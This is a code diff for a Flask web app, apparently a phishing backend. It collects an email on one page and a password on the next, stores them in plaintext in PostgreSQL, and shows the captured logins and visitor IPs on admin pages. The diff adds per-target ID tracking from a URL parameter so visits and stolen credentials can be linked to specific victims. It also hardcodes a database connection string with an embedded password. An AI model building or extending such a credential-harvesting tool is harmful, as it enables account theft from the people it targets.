@@ -1,22 +1,15 @@
-from flask import Flask, request, render_template, redirect, session, render_template_string
+from flask import Flask, request, render_template, redirect, session
 import psycopg2
 from psycopg2.extras import RealDictCursor
 from datetime import datetime
-import os
 
 app = Flask(__name__)
 app.secret_key = "ceci_est_une_clé_secrète_à_modifier"
 
-# URL PostgreSQL Render
 DATABASE_URL = "postgresql://admin:wRGvLO4UKrNf7Uq7t0nbXoDTpKPkL4rJ@dpg-cvufunmuk2gs738bgifg-a.frankfurt-postgres.render.com/logins_pezw"
 
 def get_db():
     return psycopg2.connect(DATABASE_URL, cursor_factory=RealDictCursor)
-
-def get_client_ip():
-    if request.headers.get("X-Forwarded-For"):
-        return request.headers.get("X-Forwarded-For").split(",")[0]
-    return request.remote_addr
 
 def init_db():
     with get_db() as conn:
@@ -26,7 +19,8 @@ def init_db():
                     id SERIAL PRIMARY KEY,
                     timestamp TEXT,
                     email TEXT,
-                    password TEXT
+                    password TEXT,
+                    user_id TEXT
                 )
             """)
             c.execute("""
@@ -34,7 +28,8 @@ def init_db():
                     id SERIAL PRIMARY KEY,
                     timestamp TEXT,
                     ip TEXT,
-                    user_agent TEXT
+                    user_agent TEXT,
+                    user_id TEXT
                 )
             """)
         conn.commit()
@@ -42,15 +37,19 @@ def init_db():
 @app.before_request
 def track_visit():
     if request.endpoint not in ("static",):
-        ip = get_client_ip()
-        user_agent = request.headers.get("User-Agent")
-        timestamp = datetime.now().isoformat(timespec='seconds')
+        user_id = request.args.get("id") or session.get("user_id", "inconnu")
+        session["user_id"] = user_id
 
         with get_db() as conn:
             with conn.cursor() as c:
                 c.execute(
-                    "INSERT INTO visits (timestamp, ip, user_agent) VALUES (%s, %s, %s)",
-                    (timestamp, ip, user_agent)
+                    "INSERT INTO visits (timestamp, ip, user_agent, user_id) VALUES (%s, %s, %s, %s)",
+                    (
+                        datetime.now().isoformat(timespec='seconds'),
+                        request.remote_addr,
+                        request.headers.get("User-Agent"),
+                        user_id
+                    )
                 )
             conn.commit()
 
@@ -62,13 +61,14 @@ def home():
 def step1():
     email = request.form.get("email")
     timestamp = datetime.now().isoformat(timespec='seconds')
+    user_id = session.get("user_id", "inconnu")
 
     session["email"] = email
     session["timestamp"] = timestamp
 
     with get_db() as conn:
         with conn.cursor() as c:
-            c.execute("INSERT INTO logins (timestamp, email, password) VALUES (%s, %s, %s)", (timestamp, email, ""))
+            c.execute("INSERT INTO logins (timestamp, email, password, user_id) VALUES (%s, %s, %s, %s)", (timestamp, email, "", user_id))
         conn.commit()
 
     return render_template("password.html", email=email)
@@ -78,13 +78,14 @@ def step2():
     email = session.get("email", "non_renseigné")
     timestamp = session.get("timestamp")
     password = request.form.get("password")
+    user_id = session.get("user_id", "inconnu")
 
     with get_db() as conn:
         with conn.cursor() as c:
             c.execute("""
                 UPDATE logins SET password = %s
-                WHERE timestamp = %s AND email = %s AND password = ''
-            """, (password, timestamp, email))
+                WHERE timestamp = %s AND email = %s AND password = '' AND user_id = %s
+            """, (password, timestamp, email, user_id))
         conn.commit()
 
     session.clear()
@@ -94,12 +95,12 @@ def step2():
 def recap():
     with get_db() as conn:
         with conn.cursor() as c:
-            c.execute("SELECT timestamp, email, password FROM logins ORDER BY id DESC")
+            c.execute("SELECT timestamp, email, password, user_id FROM logins ORDER BY id DESC")
             rows = c.fetchall()
 
-    html = "<h2>Récapitulatif des tentatives</h2><table border='1'><tr><th>Horodatage</th><th>Email</th><th>Mot de passe</th></tr>"
+    html = "<h2>Récapitulatif des tentatives</h2><table border='1'><tr><th>Horodatage</th><th>Email</th><th>Mot de passe</th><th>ID utilisateur</th></tr>"
     for row in rows:
-        html += f"<tr><td>{row['timestamp']}</td><td>{row['email']}</td><td>{row['password']}</td></tr>"
+        html += f"<tr><td>{row['timestamp']}</td><td>{row['email']}</td><td>{row['password']}</td><td>{row['user_id']}</td></tr>"
     html += "</table>"
     return html
 
@@ -107,12 +108,12 @@ def recap():
 def visites():
     with get_db() as conn:
         with conn.cursor() as c:
-            c.execute("SELECT timestamp, ip, user_agent FROM visits ORDER BY id DESC LIMIT 50")
+            c.execute("SELECT timestamp, ip, user_agent, user_id FROM visits ORDER BY id DESC LIMIT 50")
             rows = c.fetchall()
 
-    html = "<h2>Dernières visites</h2><table border='1'><tr><th>Horodatage</th><th>IP</th><th>User-Agent</th></tr>"
+    html = "<h2>Dernières visites</h2><table border='1'><tr><th>Horodatage</th><th>IP</th><th>User-Agent</th><th>ID utilisateur</th></tr>"
     for row in rows:
-        html += f"<tr><td>{row['timestamp']}</td><td>{row['ip']}</td><td>{row['user_agent']}</td></tr>"
+        html += f"<tr><td>{row['timestamp']}</td><td>{row['ip']}</td><td>{row['user_agent']}</td><td>{row['user_id']}</td></tr>"
     html += "</table>"
     return html
 
